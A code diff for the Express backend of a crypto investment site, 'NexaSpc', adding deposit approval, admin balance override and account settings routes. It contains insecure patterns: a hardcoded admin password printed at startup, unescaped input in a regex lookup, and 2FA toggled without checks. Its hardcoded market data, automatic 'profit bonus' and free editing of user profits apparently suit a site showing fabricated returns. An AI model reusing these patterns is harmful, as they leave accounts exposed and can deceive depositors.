+    console.error("❌ Error in /api/deposit:", err);
+    return res.status(500).json({ error: 'Failed to process deposit' });
   }
 });
 
-// Admin approval route
-app.post('/api/admin/approve-deposit', adminMiddleware, async (req, res) => {
-  const { userId, amount } = req.body;
+// ══════════════════════════════════════════════════════════════
+//  HELPER FUNCTION: CREDIT USER DEPOSIT (IN SERVER.JS)
+// ══════════════════════════════════════════════════════════════
+async function creditUserDeposit(userId, coin, amount) {
+  const profitBonus = amount * 0.05;
+  const totalCredit = amount + profitBonus;
 
-  await User.findByIdAndUpdate(userId, {
-    $inc: { walletBalance: amount, deposits: amount }
-  });
+  const user = await User.findById(userId);
+  if (!user) return null;
 
-  return res.json({ success: true, message: 'Deposit approved and balance credited.' });
-});
- 
+  user.walletBalance = (user.walletBalance || 0) + totalCredit;
+  user.deposits = (user.deposits || 0) + amount;
+  user.profits = (user.profits || 0) + profitBonus;
+
+  if (!Array.isArray(user.holdings)) user.holdings = [];
+  let holding = user.holdings.find(h => h.coin === coin);
+  if (holding) {
+    holding.amount += amount;
+    holding.usdValue += amount;
+  } else {
+    user.holdings.push({ coin: coin || 'USD', amount, usdValue: amount });
+  }
+
+  await user.save();
+  return user;
+}
+
 // ─── WITHDRAW ─────────────────────────────────────────────────
 app.post('/api/withdraw', authMiddleware, (req, res) => {
   const { coin, amount, walletAddress, source } = req.body;
   const user = users[req.user.email];
   if (!coin || !amount || !walletAddress) return res.status(400).json({ error: 'All fields required' });
   const amt = parseFloat(amount);
-  const available = source === 'profits' ? user.profits : user.balance;
+  const available = source === 'profits' ? user.profits : user.walletBalance;
   if (amt > available) return res.status(400).json({ error: 'Insufficient funds' });
-  if (source === 'profits') user.profits -= amt; else user.balance -= amt;
+  if (source === 'profits') user.profits -= amt; else user.walletBalance -= amt;
   const tx = { id: Date.now(), type: 'withdrawal', coin, amount: amt, walletAddress, source, status: 'pending', date: new Date().toISOString() };
   transactions[req.user.email].push(tx);
   pushNotif(req.user.email, 'withdrawal', `Withdrawal of $${amt.toFixed(2)} (${coin}) submitted.`);
   sendEmail(req.user.email, '⏳ Withdrawal Submitted - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto"><h2 style="color:#00d4ff">Withdrawal Submitted</h2><p>Amount: $${amt.toFixed(2)} (${coin})</p><p>To: ${walletAddress}</p></div>`);
-  res.json({ success: true, transaction: tx, balance: user.balance, profits: user.profits });
-});
-
-//Update Balance
-// Admin endpoint to adjust or reset any user's financial metrics
-app.post('/api/admin/update-balance', adminMiddleware, async (req, res) => {
-  try {
-    const { targetEmail, newBalance, newDeposits, newProfits, resetHoldings } = req.body;
-    const user = await User.findOne({ email: targetEmail.toLowerCase().trim() });
-    
-    if (!user) return res.status(404).json({ error: 'User not found' });
-
-    if (newBalance !== undefined) user.walletBalance = parseFloat(newBalance);
-    if (newDeposits !== undefined) user.deposits = parseFloat(newDeposits);
-    if (newProfits !== undefined) user.profits = parseFloat(newProfits);
-
-
-    if (resetHoldings) {
-      user.holdings = []; // Empties all holdings back to 0
-    }
-
-    await user.save();
-    
-    return res.json({ success: true, message: `Updated balance for ${user.email}`, user });
-  } catch (err) {
-    return res.status(500).json({ error: 'Admin balance override failed.' });
-  }
+  res.json({ success: true, transaction: tx, walletBalance: user.walletBalance, profits: user.profits });
 });
  
 // ─── TRANSACTIONS ─────────────────────────────────────────────
@@ -1068,7 +932,69 @@ app.get('/api/markets', (req, res) => res.json([
   { symbol: 'DOGE/USDT', price:    0.1543,change:  5.62, volume:  '1.1B' },
   { symbol: 'AVAX/USDT', price:    38.92, change: -2.11, volume:  '654M' }
 ]));
+
+// USER SETTINGS AND NOTIFICATIONS
+
+// ─── SETTINGS ─────────────────────────────────────────────────
+app.put('/api/settings/profile', authMiddleware, (req, res) => {
+  const user = users[req.user.email];
+  const { username, phone, country } = req.body;
+  if (username) user.username = username;
+  if (phone !== undefined) user.phone = phone;
+  if (country !== undefined) user.country = country;
+  pushNotif(req.user.email, 'settings', 'Profile information updated.');
+  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
+});
  
+app.put('/api/settings/password', authMiddleware, async (req, res) => {
+  const { currentPassword, newPassword } = req.body;
+  const user = users[req.user.email];
+  const match = await bcrypt.compare(currentPassword, user.password);
+  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
+  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
+  user.password = await bcrypt.hash(newPassword, 10);
+  pushNotif(req.user.email, 'security', 'Password changed successfully.');
+  await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
+    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
+      <h2 style="color:#00d4ff">Password Changed</h2>
+      <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
+    </div>`);
+  res.json({ success: true });
+});
+ 
+app.put('/api/settings/2fa', authMiddleware, (req, res) => {
+  const user = users[req.user.email];
+  user.twoFAEnabled = !user.twoFAEnabled;
+  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
+  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
+});
+ 
+app.put('/api/settings/notifications', authMiddleware, (req, res) => {
+  const user = users[req.user.email];
+  user.emailNotifications = !user.emailNotifications;
+  res.json({ success: true, emailNotifications: user.emailNotifications });
+});
+ 
+// ─── NOTIFICATIONS ────────────────────────────────────────────
+// app.get('/api/notifications', authMiddleware, (req, res) => {
+//   res.json(notifications[req.user.email] || []);
+// });
+// app.put('/api/notifications/read', authMiddleware, (req, res) => {
+//   (notifications[req.user.email] || []).forEach(n => n.read = true);
+//   res.json({ success: true });
+// });
+
+
+// Wallet addresses for deposits
+// const walletAddresses = {
+//   BTC: '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
+//   ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+//   USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
+//   XRP: 'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
+//   SOL: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
+// };
+ 
+// ADMIN Authentication
 // ─── ADMIN ────────────────────────────────────────────────────
 app.post('/api/admin/login', (req, res) => {
   const { password } = req.body;
@@ -1076,15 +1002,151 @@ app.post('/api/admin/login', (req, res) => {
   const token = jwt.sign({ role: 'admin' }, ADMIN_SECRET, { expiresIn: '12h' });
   res.json({ token });
 });
-app.get('/api/admin/users', adminMiddleware, (req, res) => {
-  res.json(Object.values(users).map(u => ({
-    username: u.username, email: u.email, phone: u.phone,
-    balance: u.balance, deposits: u.deposits, profits: u.profits, bonuses: u.bonuses,
-    emailVerified: u.emailVerified, phoneVerified: u.phoneVerified,
-    createdAt: u.createdAt, lastLogin: u.lastLogin, country: u.country,
-    walletCount: (connectedWallets[u.email] || []).length
-  })));
+
+// ══════════════════════════════════════════════════════════════
+//  GET ALL USERS FROM MONGO DB FOR ADMIN TABLE
+// ══════════════════════════════════════════════════════════════
+app.get('/api/admin/users', adminMiddleware, async (req, res) => {
+  try {
+    // Fetch all users directly from MongoDB, omitting passwords
+    const mongoUsers = await User.find({}, '-password').sort({ createdAt: -1 });
+
+    console.log(`[ADMIN GET USERS] Found ${mongoUsers.length} users in MongoDB.`);
+    
+    return res.status(200).json({
+      success: true,
+      count: mongoUsers.length,
+      users: mongoUsers
+    });
+  } catch (err) {
+    console.error('❌ Error fetching admin user directory:', err);
+    return res.status(500).json({ error: 'Failed to retrieve users from MongoDB.' });
+  }
 });
+
+app.get('/api/admin/users/:email', adminMiddleware, (req, res) => {
+  const email = decodeURIComponent(req.params.email);
+  const user = users[email];
+  if (!user) return res.status(404).json({ error: 'Not found' });
+  res.json({ ...user, password: '***', transactions: transactions[email] || [], notifications: notifications[email] || [], connectedWallets: connectedWallets[email] || [] });
+});
+
+// ══════════════════════════════════════════════════════════════
+//  ADMIN MIDDLEWARE (WITH JWT VERIFICATION)
+// ═════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════════
+// 1. GET ALL USERS API FOR ADMIN TABLE
+// ══════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════════
+//  ADMIN OVERRIDE USER VALUES IN MONGO DB
+//  POST /api/admin/users/update
+// ══════════════════════════════════════════════════════════════
+
+// ==========================================
+// ADMIN USER MANAGEMENT ENDPOINTS
+// ==========================================
+
+// 1. GET ALL USERS DIRECTORY
+app.get('/api/admin/users', adminMiddleware, async (req, res) => {
+  try {
+    const users = await User.find({}, '-password').sort({ createdAt: -1 }).lean();
+
+    console.log(`[ADMIN DIRECTORY] Found ${users.length} users in MongoDB.`);
+
+    return res.status(200).json({
+      success: true,
+      count: users.length,
+      users: users
+    });
+  } catch (err) {
+    console.error("❌ Admin Directory Fetch Error:", err);
+    return res.status(500).json({ error: 'Failed to retrieve users directory' });
+  }
+});
+
+// 2. UNIFIED METRIC & PROFILE OVERRIDE (BY ID OR EMAIL)
+// 2. UNIFIED METRIC & PROFILE OVERRIDE (BY ID OR EMAIL)
+app.post('/api/admin/users/update', adminMiddleware, async (req, res) => {
+  try {
+    console.log("📥 Received Admin Update Request:", req.body);
+
+    const { 
+      userId, 
+      email, 
+      targetEmail, 
+      username, 
+      walletBalance, 
+      bonuses, 
+      deposits, 
+      profits, 
+      resetHoldings 
+    } = req.body;
+
+    // Normalize identifiers
+    const cleanUserId = (userId && typeof userId === 'string' && userId.trim() !== "") ? userId.trim() : null;
+    const cleanEmail = (email || targetEmail || "").toString().trim().toLowerCase();
+
+    // Guard check: Must have either an ID or an Email
+    if (!cleanUserId && !cleanEmail) {
+      return res.status(400).json({ error: 'User ID or Email is required.' });
+    }
+
+    // Locate user in database
+    let user = null;
+    if (cleanUserId) {
+      user = await User.findById(cleanUserId);
+    } 
+    
+    if (!user && cleanEmail) {
+      // Case-insensitive regex search for email match
+      user = await User.findOne({ email: { $regex: new RegExp(`^${cleanEmail}$`, 'i') } });
+    }
+
+    if (!user) {
+      return res.status(404).json({ error: `User not found for email/ID: ${cleanEmail || cleanUserId}` });
+    }
+
+    // Helper to safely apply numeric updates only if provided
+    const applyNum = (val) => (val !== undefined && val !== null && !isNaN(Number(val)) ? Number(val) : null);
+
+    const newBalance = applyNum(walletBalance);
+    const newBonuses = applyNum(bonuses);
+    const newDeposits = applyNum(deposits);
+    const newProfits = applyNum(profits);
+
+    if (username !== undefined && username !== null) user.username = username;
+    if (newBalance !== null) user.walletBalance = newBalance;
+    if (newBonuses !== null) user.bonuses = newBonuses;
+    if (newDeposits !== null) user.deposits = newDeposits;
+    if (newProfits !== null) user.profits = newProfits;
+
+    if (resetHoldings) user.holdings = [];
+
+    await user.save();
+
+    console.log(`✅ [ADMIN OVERRIDE] Updated metrics for user ${user.email}`);
+
+    const userObj = user.toObject();
+    delete userObj.password;
+
+    return res.status(200).json({
+      success: true,
+      message: 'User updated successfully!',
+      user: userObj
+    });
+
+  } catch (err) {
+    console.error('❌ [/api/admin/users/update] Error:', err);
+    return res.status(500).json({ error: 'Server error updating user values.' });
+  }
+});
+
+// Alias redirect for backward compatibility if any old frontend code hits /api/admin/update-user
+app.post('/api/admin/update-user', adminMiddleware, (req, res, next) => {
+  req.url = '/api/admin/users/update';
+  app._router.handle(req, res, next);
+});
+
 app.get('/api/admin/pending', adminMiddleware, (req, res) => {
   res.json(Object.values(pendingUsers).map(p => ({
     username: p.username, email: p.email,
@@ -1092,23 +1154,88 @@ app.get('/api/admin/pending', adminMiddleware, (req, res) => {
     phoneVerified: p.phoneVerified, createdAt: p.createdAt
   })));
 });
-app.get('/api/admin/users/:email', adminMiddleware, (req, res) => {
-  const email = decodeURIComponent(req.params.email);
-  const user = users[email];
-  if (!user) return res.status(404).json({ error: 'Not found' });
-  res.json({ ...user, password: '***', transactions: transactions[email] || [], notifications: notifications[email] || [], connectedWallets: connectedWallets[email] || [] });
+
+// ══════════════════════════════════════════════════════════════
+// 1. GET ALL PENDING DEPOSITS FOR ADMIN
+// ══════════════════════════════════════════════════════════════
+// MUST BE REGISTERED BEFORE static middleware or app.get('*')
+app.get('/api/admin/pending-deposits', adminMiddleware, async (req, res) => {
+  try {
+    const pendingDeposits = await Transaction.find({ 
+      type: 'deposit', 
+      status: 'pending' 
+    }).sort({ createdAt: -1 }).lean();
+
+    return res.status(200).json({
+      success: true,
+      deposits: pendingDeposits
+    });
+  } catch (err) {
+    console.error("❌ Error fetching pending deposits:", err);
+    return res.status(500).json({ error: "Failed to fetch pending deposits" });
+  }
 });
+
+// ══════════════════════════════════════════════════════════════
+// 2. APPROVE DEPOSIT AND CREDIT WALLETBALANCE
+// ══════════════════════════════════════════════════════════════
+app.post('/api/admin/approve-deposit', adminMiddleware, async (req, res) => {
+  try {
+    const { depositId } = req.body;
+
+    if (!depositId) {
+      return res.status(400).json({ error: 'Deposit ID is required' });
+    }
+
+    // 1. Find the pending transaction document
+    const tx = await Transaction.findById(depositId);
+    if (!tx) {
+      return res.status(404).json({ error: 'Transaction record not found' });
+    }
+
+    if (tx.status !== 'pending') {
+      return res.status(400).json({ error: `Transaction is already ${tx.status}` });
+    }
+
+    // 2. Mark transaction as completed
+    tx.status = 'completed';
+    tx.updatedAt = new Date();
+    await tx.save();
+
+    // 3. Credit user's walletBalance, deposits, profits, and holdings
+    await creditUserDeposit(tx.userId, tx.coin, tx.amount);
+
+    // Fetch updated user to return fresh balance
+    const updatedUser = await User.findById(tx.userId);
+
+    console.log(`✅ Admin approved $${tx.amount} (${tx.coin}) for ${tx.userEmail}`);
+
+    return res.status(200).json({
+      success: true,
+      message: `Successfully credited $${tx.amount} to ${tx.userEmail}`,
+      userEmail: tx.userEmail,
+      amount: tx.amount,
+      updatedBalance: updatedUser ? updatedUser.walletBalance : 0
+    });
+
+  } catch (err) {
+    console.error("❌ Error approving deposit:", err);
+    return res.status(500).json({ error: "Server error approving deposit" });
+  }
+});
+
 app.get('/api/admin/wallets', adminMiddleware, (req, res) => {
   const all = [];
   for (const [email, wallets] of Object.entries(connectedWallets))
     wallets.forEach(w => all.push({ ...w, userEmail: email, username: users[email]?.username }));
   res.json(all);
 });
+
 app.get('/api/admin/log', adminMiddleware, (req, res) => res.json(adminLog.slice(0, 200)));
  
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, '../public/admin.html')));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../public/index.html')));
- 
+
 app.listen(PORT, () => {
   console.log(`\n🚀 NexaSpc  → http://localhost:${PORT}`);
   console.log(`🛡️  Admin    → http://localhost:${PORT}/admin  (pass: nexaspc_admin_pass)\n`);
